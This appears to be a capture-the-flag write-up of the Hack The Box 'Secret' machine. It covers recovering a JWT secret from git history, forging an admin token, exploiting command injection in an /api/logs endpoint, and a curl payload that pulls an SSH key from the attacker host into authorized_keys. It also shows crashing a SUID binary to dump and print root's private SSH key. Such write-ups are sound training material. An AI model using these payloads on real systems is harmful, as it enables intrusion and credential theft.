# [secret](https://app.hackthebox.com/machines/Secret)

> A Linux machine hosting an authentication API and its source code. Its source code is a `git` repository and its initial commits reveals the secret it uses to sign JWTs for authorizing its endpoints. By using this secret to forge a JWT, it is possible to access an endpoint which is vulnerable to command injection and obtain a low-privileged shell. The system contains a SUID binary owned by `root` that can read an arbitrary file into memory and then be killed with a `SIGSEGV` signal, producing a memory dump that contains the contents of the file. This can be exploited to read `root`'s SSH private key, granting privileged access to the system.

---

## Open Port Enumeration

```bash
$ sudo masscan -p1-65535 10.129.155.137 --rate=1000 -e tun0 --output-format grepable --output-filename enum/secret.masscan
$ cat enum/secret.masscan  | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','
22,3000,80,
```

According to [launchpad.net](https://launchpad.net/ubuntu/+source/openssh/1:8.2p1-4ubuntu0.3), the OpenSSH banner indicates the target's operating system is Ubuntu 20.04 (Focal).

The target appears to be serving Nginx 1.18.0 on port 80 and a Node.js/Express web application on port 3000. Both are titled `DUMB Docs`.

```bash
$ sudo nmap -sC -sV -O -p22,3000,80 10.129.155.137 -oA enum/secret
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-10 17:54 EST
Nmap scan report for 10.129.155.137
Host is up (0.044s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
|_  256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: DUMB Docs
|_http-server-header: nginx/1.18.0 (Ubuntu)
3000/tcp open  http    Node.js (Express middleware)
|_http-title: DUMB Docs
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.91 seconds
```

---

## Port 80 Enumeration

Port 80's landing page appears to be documentation for an "API based authentication system" that is "using JWT tokens to make things more secure." Port 3000 appears to be the exact same application.

It indicates the authentication system is written in Node.js and leverages MongoDB. 

The authentication system's source code can be downloaded from `/download/files.zip`.

---

## Authentication System - Source Code Analysis

Unzipping `file.zip` results in the directory `local-web/`, containing the Express application's source code.

The application's entry point is `index.js`, which does the following:

1. Setup static directories `/assets` (mapped to `public/assets`) and `/download` (mapped to `public/source`)
2. Initialize the views at `src/views`
3. Maps the following routes:
	- `/api/user` -> `routes/auth` (`authRoute`)
	- `/api` -> `routes/private` (`privRoute`)
	- `/` -> `src/routes/web` (`webRoute`)
4. Begins serving the application on `localhost:3000`

### The Authentication Routes

There are two routes here: `/api/user/register` and `/api/user/login`.

`/api/user/register` allows a user to register themselves by specifying an email address, username, and password. The email address and username are checked to make sure they don't already belong to another user in the database. Once the options are validated, the user is added to the database.

`/api/user/login` allows a user to login by specifying an email address and password. Upon a successful login, the application creates a JWT whose payload is the corresponding user data from the database: a user ID, name, and email. The application creates this JWT with the value of the `TOKEN_SECRET` as the secret.

### The Private Routes

There are two routes here: `/api/priv` and `/api/log`.

Both routes confirm the JWT in the `auth-token` HTTP header is valid and then perform different actions based on the payload's `name` (username) attribute.

`/api/priv` simply returns one hardcoded responses if `name` is `theadmin` and another hardcoded payload otherwise.

`/api/log` is more interesting. It takes an additional query parameter `file`. If `name` is `theadmin`, it will execute the following operating system command:

```bash
git log --oneline $FILE
```

where `$FILE` is the value of the query parameter `file`. This is ripe for operating system command injection.

---

## Generating an Administrative JWT & Command Injection

After a successful authentication, the `/api/user/login` generates a JWT using the value from the the `TOKEN_SECRET` environment variable as the secret.

```javascript
// create jwt
const token = jwt.sign(
	{
		_id: user.id,
		name: user.name,
		email: user.email
	}, 
	process.env.TOKEN_SECRET
)
```

The environment variables are loaded in the program's entrypoint, `index.js` using the [dotenv](https://www.npmjs.com/package/dotenv) library.

```javascript
dotenv.config();
```

The [dotenv](https://www.npmjs.com/package/dotenv) library loads environment variables from a `.env` file in the same directory as `index.js`. It appears the developer forgot to delete this file before including it in the archive, revealing the secret value `secret`.

```bash
$ cat .env
DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = secret
```

However, testing this secret by attempting to decode a legitimate JWT generated by the application (from a successful logon attempt) indicates that `secret` is not the correct secret value.

```python
>>> import jwt
>>> token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjA1YTU0YTFhNzFmMDA0NzllYjk4ZmQiLCJuYW1lIjoidGdpaGYtc2VjcmV0IiwiZW1haWwiOiJ0Z2loZkB0Z2loZi5jbGljayIsImlhdCI6MTY0NDU2MDI2N30.xJZnqd60iLM_W3pFWc8MSQTygeTtgy89ETKPRRzDgr0"
>>> secret = "secret"
>>> jwt.decode(token, secret, algorithms=["HS256"])
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/home/tgihf/.local/lib/python3.9/site-packages/jwt/api_jwt.py", line 119, in decode
    decoded = self.decode_complete(jwt, key, algorithms, options, **kwargs)
  File "/home/tgihf/.local/lib/python3.9/site-packages/jwt/api_jwt.py", line 90, in decode_complete
    decoded = api_jws.decode_complete(
  File "/home/tgihf/.local/lib/python3.9/site-packages/jwt/api_jws.py", line 152, in decode_complete
    self._verify_signature(signing_input, header, signature, key, algorithms)
  File "/home/tgihf/.local/lib/python3.9/site-packages/jwt/api_jws.py", line 239, in _verify_signature
    raise InvalidSignatureError("Signature verification failed")
jwt.exceptions.InvalidSignatureError: Signature verification failed
```

It appears the application is also a `git` repository, as it contains a `.git/` folder at its root.

```bash
$ ls -la local-web/.git
total 504
drwxrwxr-x   8 tgihf tgihf   4096 Sep  8 14:33 .
drwxrwxr-x   8 tgihf tgihf   4096 Feb 10 18:36 ..
drwxrwxr-x   2 tgihf tgihf   4096 Sep  3 01:55 branches
-rw-rw-r--   1 tgihf tgihf     38 Sep  8 14:33 COMMIT_EDITMSG
-rw-rw-r--   1 tgihf tgihf     92 Sep  3 01:55 config
-rw-rw-r--   1 tgihf tgihf     73 Sep  3 01:55 description
-rw-rw-r--   1 tgihf tgihf     23 Sep  3 01:55 HEAD
drwxrwxr-x   2 tgihf tgihf   4096 Sep  3 01:55 hooks
-rw-rw-r--   1 tgihf tgihf 463197 Sep  8 14:33 index
drwxrwxr-x   2 tgihf tgihf   4096 Sep  3 01:55 info
drwxrwxr-x   3 tgihf tgihf   4096 Sep  3 01:55 logs
drwxrwxr-x 260 tgihf tgihf   4096 Sep  8 14:33 objects
drwxrwxr-x   4 tgihf tgihf   4096 Sep  3 01:55 refs
```

Perhaps the legitimate secret value is in one of the repository's previous commits. Use `GitTools`' `extractor.sh` to extract all the commits associated with the repository, revealing six distinct commits.

```bash
$ mkdir extracted
$ /opt/GitTools/Extractor/extractor.sh local-web extracted
$ ls extracted
0-55fe756a29268f9b4e786ae468952ca4a8df1bd8
2-e297a2797a5f62b6011654cf6fb6ccb6712d2d5b
4-3a367e735ee76569664bf7754eaaade7c735d702
1-4e5547295cfe456d8ca7005cb823e1101fd1f9cb
3-de0a46b5107a2f4d26e348303e76d85ae4870934
5-67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
```

`.env` has all the same `TOKEN_SECRET` value in every commit except for the final one: `gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE`.

```bash
$ for d in $(ls extracted); do cat extracted/$d/.env; done
DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = secret
DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = secret
```

Confirm this secret is valid by using it to decode a legitimate JWT from the web application.

```python
>>> import jwt
>>> token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjA1YTU0YTFhNzFmMDA0NzllYjk4ZmQiLCJuYW1lIjoidGdpaGYtc2VjcmV0IiwiZW1haWwiOiJ0Z2loZkB0Z2loZi5jbGljayIsImlhdCI6MTY0NDU2MDI2N30.xJZnqd60iLM_W3pFWc8MSQTygeTtgy89ETKPRRzDgr0"
>>> secret = "gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE"
>>> jwt.decode(token, secret, algorithms=["HS256"])
{'_id': '6205a54a1a71f00479eb98fd', 'name': 'tgihf-secret', 'email': 'tgihf@tgihf.click', 'iat': 1644560267}
```

The command injection vulnerability in the `/api/logs` endpoint is only accessible with a JWT whose payload has a `name` value of `theadmin`. Generate a JWT with such a payload using the obtained secret.

```python
>>> import jwt
>>> secret = "gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE"
>>> payload = {"name": "theadmin", "email": "root@dasith.works"}
>>> jwt.encode(payload, secret, algorithm="HS256")
'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIn0.ao6g0m3rhMoh8UxjtbTuxL_TBFNxijlH21NoLOxtrJ0'
```

Use this JWT in the `auth-token` HTTP header to query the `/api/logs` endpoint, injecting the `id` command. The output confirms the presence of the vulnerability and that command injection is occurring in the context of the `dasith` user.

```http
GET /api/logs?file=.;id HTTP/1.1
Host: 10.129.155.137
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
auth-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIn0.ao6g0m3rhMoh8UxjtbTuxL_TBFNxijlH21NoLOxtrJ0
Upgrade-Insecure-Requests: 1
```

```http
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 155
ETag: W/"9b-6cJp+SkJqlDFkmKttxMb7Zneqvg"
Date: Fri, 11 Feb 2022 06:22:03 GMT
Connection: close

"80bf34c fixed typos 🎉\n0c75212 now we can view logs from server 😃\nab3e953 Added the codes\nuid=1000(dasith) gid=1000(dasith) groups=1000(dasith)\n"
```

Exploit this vulnerability to add an SSH public key to `dasith`'s `authorized_keys` file. Serve the public key, create the `.ssh` directory in `dasith`'s home directory, and stage the file.

```bash
$ curl 'http://10.129.155.247/api/logs?file=.+>/dev/null;mkdir+/home/dasith/.ssh' -H 'auth-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIn0.ao6g0m3rhMoh8UxjtbTuxL_TBFNxijlH21NoLOxtrJ0'

$ curl 'http://10.129.155.247/api/logs?file=.+>/dev/null;curl+http://10.10.14.109/secret.pub+>+/home/dasith/.ssh/authorized_keys' -H 'auth-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIn0.ao6g0m3rhMoh8UxjtbTuxL_TBFNxijlH21NoLOxtrJ0'
```

Log in as `dasith` via SSH and grab the user flag.

```bash
$ ssh dasith@10.129.155.137
The authenticity of host '10.129.155.137 (10.129.155.137)' can't be established.
ED25519 key fingerprint is SHA256:TMkIYJ5kXqHFji0NCRdDDvYT114MAOOsRgTr5/Xd/GM.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.155.137' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-89-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 11 Feb 2022 06:27:35 AM UTC

  System load:           0.08
  Usage of /:            52.9% of 8.79GB
  Memory usage:          11%
  Swap usage:            0%
  Processes:             214
  Users logged in:       0
  IPv4 address for eth0: 10.129.155.137
  IPv6 address for eth0: dead:beef::250:56ff:feb9:5b6e


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Sep  8 20:10:26 2021 from 10.10.1.168
dasith@secret:~$ ls -la ~/user.txt
-r-------- 1 dasith dasith 33 Feb 10 22:49 /home/dasith/user.txt
```

---

## SUID `root` Binary & Reading `root`'s SSH Private Key

`/opt/count` is a non-standard SUID file.

```bash
dasith@secret:/home$ find / -perm -u=s -type f -print 2>/dev/null
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/opt/count
/snap/snapd/13640/usr/lib/snapd/snap-confine
/snap/snapd/13170/usr/lib/snapd/snap-confine
/snap/core20/1169/usr/bin/chfn
/snap/core20/1169/usr/bin/chsh
/snap/core20/1169/usr/bin/gpasswd
/snap/core20/1169/usr/bin/mount
/snap/core20/1169/usr/bin/newgrp
/snap/core20/1169/usr/bin/passwd
/snap/core20/1169/usr/bin/su
/snap/core20/1169/usr/bin/sudo
/snap/core20/1169/usr/bin/umount
/snap/core20/1169/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1169/usr/lib/openssh/ssh-keysign
/snap/core18/2128/bin/mount
/snap/core18/2128/bin/ping
/snap/core18/2128/bin/su
/snap/core18/2128/bin/umount
/snap/core18/2128/usr/bin/chfn
/snap/core18/2128/usr/bin/chsh
/snap/core18/2128/usr/bin/gpasswd
/snap/core18/2128/usr/bin/newgrp
/snap/core18/2128/usr/bin/passwd
/snap/core18/2128/usr/bin/sudo
/snap/core18/2128/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2128/usr/lib/openssh/ssh-keysign
/snap/core18/1944/bin/mount
/snap/core18/1944/bin/ping
/snap/core18/1944/bin/su
/snap/core18/1944/bin/umount
/snap/core18/1944/usr/bin/chfn
/snap/core18/1944/usr/bin/chsh
/snap/core18/1944/usr/bin/gpasswd
/snap/core18/1944/usr/bin/newgrp
/snap/core18/1944/usr/bin/passwd
/snap/core18/1944/usr/bin/sudo
/snap/core18/1944/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1944/usr/lib/openssh/ssh-keysign	
```

It's an ELF binary and owned by `root`.

```bash
dasith@secret:/home$ file /opt/count
/opt/count: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=615b7e12374cd1932161a6a9d9a737a63c7be09a, for GNU/Linux 3.2.0, not stripped
dasith@secret:/home$ ls -la /opt/count
-rwsr-xr-x 1 root root 17824 Oct  7 10:03 /opt/count
```

Upon execution, the program prompts the user for a file or directory path.

When given a file path, it counts the total number of characters, words, and lines in the program, similar to `wc`. It then prompts the user to save the results to a file. 

```bash
dasith@secret:/dev/shm/tgihf$ /opt/count
Enter source file/directory name: /dev/shm/tgihf/bar.txt

Total characters = 4
Total words      = 2
Total lines      = 2
Save results a file? [y/N]: y
Path: /dev/shm/tgihf/bar-results.txt
dasith@secret:/dev/shm/tgihf$ cat /dev/shm/tgihf/bar-results.txt
Total characters = 4
Total words      = 2
Total lines      = 2
```

When given a directory path, the program lists the contents of the directory and then counts the number of entries, regular files, directories, and symbolic links. It then prompts the user to save the results to a file.

```bash
dasith@secret:/dev/shm/tgihf$ /opt/count
Enter source file/directory name: /dev/shm/tgihf
drwxrwxr-x      .
drwxrwxrwx      ..
-rw-rw-r--      bar-results.txt
-rw-rw-r--      bar.txt

Total entries       = 4
Regular files       = 2
Directories         = 2
Symbolic links      = 0
Save results a file? [y/N]: y
Path: /dev/shm/tgihf/tgihf-dir-results.txt
dasith@secret:/dev/shm/tgihf$ cat /dev/shm/tgihf/tgihf-dir-results.txt
Total entries       = 4
Regular files       = 2
Directories         = 2
Symbolic links      = 0
```

The program's source code can be found at `/opt/code.c`. Reading through the code, when given a file path, it calls the `filecount` function on the path. This function reads the file at `path` into memory and performs the counting. Interestingly, the program never releases this memory, even after it finishes the counting.

```c
void filecount(const char *path, char *summary)
{
    FILE *file;
    char ch;
    int characters, words, lines;

    file = fopen(path, "r");

    if (file == NULL)
    {
        printf("\nUnable to open file.\n");
        printf("Please check if file exists and you have read privilege.\n");
        exit(EXIT_FAILURE);
    }

    characters = words = lines = 0;
    while ((ch = fgetc(file)) != EOF)
    {
        characters++;
        if (ch == '\n' || ch == '\0')
            lines++;
        if (ch == ' ' || ch == '\t' || ch == '\n' || ch == '\0')
            words++;
    }

    if (characters > 0)
    {
        words++;
        lines++;
    }

    snprintf(summary, 256, "Total characters = %d\nTotal words      = %d\nTotal lines      = %d\n", characters, words, lines);
    printf("\n%s", summary);
}
```

This behavior can be exploited by reading in the contents of a sensitive file and then causing the program to crash, dumping memory to a crash report. The contents of the sensitive file will be in the crash report.

Achieve this by having `/opt/count` read `root`'s SSH private key. When prompted for whether to save the count output to a file, background the process and kill it by causing a segmentation fault.

```bash
dasith@secret:/opt$ /opt/count
Enter source file/directory name: /root/.ssh/id_rsa

Total characters = 2602
Total words      = 45
Total lines      = 39
Save results a file? [y/N]: ^Z
[1]+  Stopped                 /opt/count
dasith@secret:/opt$ ps
    PID TTY          TIME CMD
   1390 pts/0    00:00:00 bash
   2268 pts/0    00:00:00 count
   2269 pts/0    00:00:00 ps
dasith@secret:/opt$ kill -SIGSEGV 2268
dasith@secret:/opt$ fg
/opt/count
Segmentation fault (core dumped)
```

`dasith`'s user ID is 1000. Use `apport-unpack` to unpack the crash report.

```bash
dasith@secret:~$ apport-unpack /var/crash/_opt_count.1000.crash crash-report
dasith@secret:~$ ls -la crash-report/
total 444
drwxrwxr-x  2 dasith dasith   4096 Feb 14 18:46 .
drwxr-xr-x 10 dasith dasith   4096 Feb 14 18:46 ..
-rw-rw-r--  1 dasith dasith      5 Feb 14 18:46 Architecture
-rw-rw-r--  1 dasith dasith 380928 Feb 14 18:46 CoreDump
-rw-rw-r--  1 dasith dasith      1 Feb 14 18:46 CrashCounter
-rw-rw-r--  1 dasith dasith     24 Feb 14 18:46 Date
-rw-rw-r--  1 dasith dasith     12 Feb 14 18:46 DistroRelease
-rw-rw-r--  1 dasith dasith     10 Feb 14 18:46 ExecutablePath
-rw-rw-r--  1 dasith dasith     10 Feb 14 18:46 ExecutableTimestamp
-rw-rw-r--  1 dasith dasith      1 Feb 14 18:46 _LogindSession
-rw-rw-r--  1 dasith dasith      5 Feb 14 18:46 ProblemType
-rw-rw-r--  1 dasith dasith     10 Feb 14 18:46 ProcCmdline
-rw-rw-r--  1 dasith dasith      4 Feb 14 18:46 ProcCwd
-rw-rw-r--  1 dasith dasith     89 Feb 14 18:46 ProcEnviron
-rw-rw-r--  1 dasith dasith   2144 Feb 14 18:46 ProcMaps
-rw-rw-r--  1 dasith dasith   1335 Feb 14 18:46 ProcStatus
-rw-rw-r--  1 dasith dasith      2 Feb 14 18:46 Signal
-rw-rw-r--  1 dasith dasith     29 Feb 14 18:46 Uname
-rw-rw-r--  1 dasith dasith      3 Feb 14 18:46 UserGroups
```

The memory dump is in the binary `CoreDump` file. Use `strings` on it to pull out `root`'s SSH private key.

```bash
dasith@secret:~$ strings crash-report/CoreDump
...
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
...
```

Use this key to login as `root` and grab the system flag.

```bash
$ ssh -i root-id-rsa root@10.129.157.79
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-89-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 14 Feb 2022 06:50:19 PM UTC

  System load:           0.08
  Usage of /:            52.7% of 8.79GB
  Memory usage:          9%
  Swap usage:            0%
  Processes:             215
  Users logged in:       1
  IPv4 address for eth0: 10.129.157.79
  IPv6 address for eth0: dead:beef::250:56ff:feb9:6565


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Oct 26 16:35:01 2021 from 10.10.14.6
root@secret:~# ls -la ~/root.txt
-r-------- 1 root root 33 Feb 14 16:38 /root/root.txt
```
